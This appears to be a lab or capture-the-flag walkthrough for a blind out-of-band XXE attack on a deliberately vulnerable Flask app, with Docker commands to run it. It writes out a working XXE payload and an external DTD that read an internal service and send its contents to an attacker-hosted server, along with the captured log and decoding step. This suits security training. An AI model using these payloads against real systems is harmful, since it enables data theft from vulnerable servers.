1. Using a browser with burp as proxy, connect to web app hosted at http://<IP_ADDRESS>:5000/

2. On that page, click on 'Return to homepage' to make a POST request (Hint: TAB + ENTER).

3. Go to Burp -> Proxy -> HTTP history and find the POST request

4. Send the POST request with '/blindOOBAttack' to Repeater

5. Include payload to top of XML data:
Format	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<ATTACKER_IP>:<ATTACKER_PORT>/<ATTACKER_DTD>"> %xxe;]>
e.g.	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.119.1:8000/BlindOOBExternal.dtd"> %xxe;]>

6. 'ATTACKER_DTD' Format:
<!ENTITY % file SYSTEM "http://localhost:7000">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<ATTACKER_IP>:<ATTACKER_PORT>/?x=%file;'>">
%eval;
%exfil;
e.g. 'BlindOOBExternal.dtd':
<!ENTITY % file SYSTEM "http://127.0.0.1:7000">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.119.1:8000/?x=%file;'>">
%eval;
%exfil;

7. Open CMD and host a server 'python3 -m http.server 8000' in the directory where ATTACKER_DTD is located

8. Go back to Burp and send the Request and no errors will be shown

9. CMD should show similar to the following:
"GET /BlindOOBExternal.dtd HTTP/1.0" 200 -
"GET /?x=MTMgQ29tcHV0aW5nIERyLCBTaW5nYXBvcmUgMTE3NDE3Cg== HTTP/1.0" 200 -

10. Go to Burp -> Decoder -> Decode as -> base64 and paste to decode the base64 or alternatively,
'echo "MTMgQ29tcHV0aW5nIERyLCBTaW5nYXBvcmUgMTE3NDE3Cg==" | base64 -d'.

11. You should now get the decoded flag!

Docker Instructions:
docker build -t e0958902/decommissioned-flask:0.0.3.RELEASE .
docker container run -d -p 5000:5000 -p 7000:7000  e0958902/decommissioned-flask:0.0.3.RELEASE
docker push e0958902/decommissioned-flask:0.0.3.RELEASE

docker pull e0958902/decommissioned-flask:0.0.3.RELEASE
docker container run -d -p 5000:5000 -p 7000:7000  e0958902/decommissioned-flask:0.0.4.RELEASE

docker container run -d -P e0958902/decommissioned-flask:0.0.3.RELEASE